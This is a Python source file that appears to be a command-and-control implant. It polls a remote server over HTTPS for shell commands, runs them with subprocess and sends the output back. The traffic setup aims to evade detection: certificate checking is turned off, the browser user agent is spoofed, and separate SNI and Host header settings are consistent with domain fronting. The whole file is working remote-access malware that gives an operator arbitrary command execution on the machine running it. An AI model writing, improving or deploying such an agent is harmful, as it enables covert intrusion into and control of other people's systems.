import ssl
import socket
import json
import time
import subprocess
import configparser

config = configparser.ConfigParser()
config.read('agent.conf')

SERVER_IP     = config.get('DEFAULT', 'SERVER_IP')
SNI_HOST      = config.get('DEFAULT', 'SNI_HOST')
FETCH_PATH    = config.get('DEFAULT', 'FETCH_PATH', fallback='/fetch_command')
POST_PATH     = config.get('DEFAULT', 'POST_PATH', fallback='/post_result')
CLIENT_ID     = config.get('DEFAULT', 'CLIENT_ID')
POLL_INTERVAL = config.getint('DEFAULT', 'POLL_INTERVAL', fallback=10)
USERNAME      = config.get('DEFAULT', 'USERNAME', fallback='agent')
HOST_HEADER   = config.get('DEFAULT', 'HOST_HEADER', fallback=SNI_HOST)

PORT = 443
USER_AGENT = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"

def send_https_request(method, path, body=None):
    try:
        context = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
        context.check_hostname = False
        context.verify_mode = ssl.CERT_NONE

        sock = socket.create_connection((SERVER_IP, PORT), timeout=5)
        conn = context.wrap_socket(sock, server_hostname=SNI_HOST)

        headers = [
            f"{method} {path} HTTP/1.1",
            f"Host: {HOST_HEADER}",
            "Connection: close",
            f"User-Agent: {USER_AGENT}",
        ]

        if method == "POST" and body is not None:
            json_body = json.dumps(body)
            headers.append("Content-Type: application/json")
            headers.append(f"Content-Length: {len(json_body)}")
            request = "\r\n".join(headers) + "\r\n\r\n" + json_body
        else:
            request = "\r\n".join(headers) + "\r\n\r\n"

        conn.sendall(request.encode())
        
        response = b""
        while True:
            data = conn.recv(4096)
            if not data:
                break
            response += data
        conn.close()
        return response.decode('utf-8', errors='ignore')
    except Exception as e:
        print(f"[error] send_https_request: {e}")
        return None

def fetch_command():
    print("[debug] entering fetch_command", flush=True)
    response = send_https_request("GET", f"{FETCH_PATH}?id={CLIENT_ID}")
    print("[debug] response", response, flush=True)
    if response and "200 OK" in response:
        try:
            # レスポンスからボディ部分を抽出
            parts = response.split("\r\n\r\n", 1)
            if len(parts) > 1:
                body = parts[1]
                return json.loads(body).get("command")
        except Exception as e:
            print("[error] parse_command:", e)
    return None

def post_result(output):
    payload = {"id": CLIENT_ID, "output": output}
    try:
        response = send_https_request("POST", POST_PATH, body=payload)
        if response:
            status_line = response.split("\r\n", 1)[0]
            if "200 OK" in status_line:
                print("[result sent]")
            else:
                print(f"[error] post_result: Unexpected status → {status_line}")
        else:
            print("[error] post_result: No response from server")
    except Exception as e:
        print(f"[error] post_result exception: {e}")

def run():
    print(f"[started] Agent running as user: {USERNAME}")
    while True:
        print(f"[polling] {SNI_HOST}({SERVER_IP}) as {CLIENT_ID} (user: {USERNAME})")
        cmd = fetch_command()
        if cmd:
            print(f"[exec] {cmd}")
            try:
                result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=30)
                post_result(result.stdout + result.stderr)
            except Exception as e:
                post_result(f"[exec error] {e}")
        time.sleep(POLL_INTERVAL)

if __name__ == "__main__":
    run()
